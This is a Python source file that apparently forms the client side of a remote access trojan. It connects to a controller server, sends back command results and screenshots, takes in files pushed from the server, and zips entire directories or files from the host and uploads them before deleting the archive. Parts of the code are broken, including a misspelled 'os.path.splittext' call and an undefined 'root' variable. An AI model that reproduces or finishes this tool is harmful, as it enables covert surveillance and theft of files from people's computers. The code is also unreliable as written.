import socket
import zipfile
import os

DELIMETER="<END_OF_RESULTS>"
class ClientConnection:
    def __init__(self):
        self.sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    #connect the client machine to server     
    def Connect(self,server_ip,server_port):
        self.sock.connect((server_ip,server_port))

    #recieve data from server
    def recv_data(self):
        self.data_in_bytes=self.sock.recv(4024)    
        self.data=self.data_in_bytes.decode('utf-8')
        return self.data

    #send data to the server
    def send_data(self,data):
        self.sock.send(bytes(data,'utf-8'))     
    #send command result to server
    def send_command_result(self,command_result):
        data2send=command_result+DELIMETER
        data2send_bytes=data2send.encode()
        self.sock.sendall(data2send_bytes)

    #receive the files
    def receive_file(self,filename):
        with open('newfiles'+filename,'wb') as file:
            while True:
                chunk=self.sock.recv(8024)
                if chunk.endswith(DELIMETER.encode()):
                    chunk=chunk[:-len(DELIMETER)]
                    file.write(chunk)
                    break
                file.write(chunk)            
        print("[+] Completed file downloading")

    def send_screenshot(self,filename):
        print("[+] sending file ")
        with open(filename,'rb') as file:
            chunk=file.read()
            while len(chunk)>0:
                self.sock.send(chunk)
                chunk=file.read(8024)
            self.sock.send(DELIMETER.encode())

    def send_file(self,toDownload):
        print("[ + ] sending the file name")
        if os.path.isdir(toDownload):
            zipped_name=toDownload+".zip"
            zipf=zipfile.ZipFile(zipped_name,'w',zipfile.ZIP_DEFLATED)#instatained zip object
            #zip the directiories
            for root,dirs,files in os.walk(toDownload):
                for file in files:
                    zipf.write(os.path.join(root,file))
            zipf.close()
            
        else:
            basename=os.path.basename(toDownload)
            name,ext=os.path.splittext(basename)
            toZip=name+".zip"
            zipf=zipfile.ZipFile(toZip,'w',zipfile.ZIP_DEFLATED)#instatained zip object
            zipf.write(os.path.join(root,basename))
            zipf.close()
            zipped_name=toZip
        zip_content=b''
        with open(zipped_name,'rb') as file:
            zip_content=file.read()
            file.close()    
        self.send_data(zipped_name)   
        zip_content_deli=zip_content+DELIMETER.encode()
        self.sock.sendall(zip_content_deli)
        os.remove(zipped_name)
        
        


    def close(self):
        self.sock.close()

            
